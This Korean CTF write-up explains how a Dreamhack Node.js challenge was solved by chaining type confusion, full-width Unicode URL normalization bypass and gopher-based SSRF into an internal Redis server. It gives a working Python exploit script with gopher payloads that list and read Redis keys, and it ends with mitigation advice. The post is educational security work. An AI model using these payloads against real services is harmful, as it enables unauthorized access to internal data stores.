---
title: ["Redis SSRF & NodeJS Unicode Normalization"]
date: 2025-02-17 09:00:00 +0900
categories: [techniques, NodeJS]
tags: [web, ssrf, redis, nodejs, unicode normalization, bypassing filters]
---
Dreamhack 문제를 풀고 관련된 개념을 정리하려고 한다.  

# Dreamhack CTF Writeup
## 문제 분석

이 문제는 Node.js 기반 웹 애플리케이션의 여러 취약점을 조합하여 플래그를 획득하는 문제입니다:
1. Type Confusion을 이용한 필터 우회
2. Unicode Normalization을 이용한 URL 파싱 우회
3. SSRF를 통한 내부 Redis 서버 접근

## 취약점 상세 분석

### 1. 로직 분석

주요 엔드포인트와 기능:
- `/add`: sess.user 객체의 프로퍼티를 수정할 수 있음
- `/view/:pid`: Redis에서 특정 키의 값을 조회 (localhost만 허용)
- `/`: 로그인한 사용자의 profile.url을 방문하여 결과를 표시

플래그는 Redis에 랜덤한 키로 저장되어 있다:
```javascript
client.set(crypto.createHash('sha512').update(crypto.randomBytes(64)).digest('hex'), FLAG);
```

### 2. 취약점 체인

#### 2.1 Type Confusion
`/add` 엔드포인트의 필터를 우회하기 위해 Type Confusion을 이용할 수 있다:
```javascript
if(value.length >= 25) {
    return res.json({
        c: -1,
        e: "Too long"
    });
}
```
위 코드는 value가 문자열일 경우에만 길이를 체크한다. value를 객체로 전달하면 이 체크를 우회할 수 있다.

#### 2.2 Unicode Normalization
Node.js v14에서 URL 파싱 시 Unicode 문자를 정규화하는 과정을 이용해 URL 검증을 우회할 수 있다:
```javascript
if(!profile_URL.host.endsWith(config.HOST))
```

특수 문자들을 유니코드로 변경: [Unicode normalization](https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html)
- `:` → `︓` (Full width colon)
- `/` → `／` (Full width slash)
- `%` → `％` (Full width percent)
- `*` → `﹡` (Full width asterisk)

### 3. 공격 시나리오

1. 로그인하여 세션 획득
2. Type Confusion을 이용해 profile 객체 조작
3. Unicode Normalization을 이용해 gopher URL 주입
4. SSRF를 통해 Redis 서버에 접근하여 키 목록 획득
5. 획득한 키를 이용해 플래그 값 조회

## 익스플로잇 코드

```python
import requests

url = "http://host1.dreamhack.games:xxxxx"
s = requests.Session()

# 1. 로그인
s.post(url + "/login", json={"username": "test", "password": "test", "email": "test"})

# 2. profile.isRender를 true로 설정하고 gopher URL 주입
payload = {
    "key": ["profile"],
    "value": {
        "url": "gopher://redis︓6379／_keys％20﹡％0d％0aquit％0d％0a127.0.0.1:8000",
        "isRender": "true"
    }
}
s.post(url + "/add", json=payload)

# 3. Redis 키 목록 획득
keys = s.get(url + "/").text
print("Found keys:", keys)

# 4. 플래그 키를 이용해 값 조회
for key in keys.split("\r\n"):
    if len(key) == 128:  # SHA-512 length
        payload = {
            "key": ["profile"],
            "value": {
                "url": f"gopher://redis︓6379／_get％20{key}％0d％0aquit％0d％0a127.0.0.1:8000",
                "isRender": "true"
            }
        }
        s.post(url + "/add", json=payload)
        print("Flag:", s.get(url + "/").text)
```

## 학습 포인트

1. JavaScript에서 Type Confusion이 발생할 수 있는 상황
2. Node.js의 URL 파싱과 Unicode Normalization의 특성
3. SSRF를 이용한 내부 서비스 접근 기법
4. Redis 프로토콜과 gopher URL을 이용한 공격

## 대응 방안

1. 타입 검사 강화
   - `typeof` 또는 스키마 검증 라이브러리 사용
   
2. URL 검증 강화
   - 허용된 프로토콜만 사용하도록 제한
   - URL 파싱 전 문자열 정규화
   
3. 내부 서비스 보안
   - Redis 바인딩 주소 제한
   - 적절한 인증 설정
   - 네트워크 분리

## Reference
[Node.js url.parse() 취약점 컨트리뷰션](https://toss.tech/article/nodejs-security-contribution)  
[nodejs unicode](https://lactea.kr/entry/nodejs-unicode)  
[JavaScript type confusion: Bypassed input validation](https://snyk.io/blog/remediate-javascript-type-confusion-bypassed-input-validation/)  
[Hostname spoofing](https://hackerone.com/reports/678487)  
[Unicode Normalization](https://book.hacktricks.wiki/en/pentesting-web/unicode-injection/index.html)  
[Alternative Unicode Character](https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html)  
[SSRF Gopher](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html#gopher)  
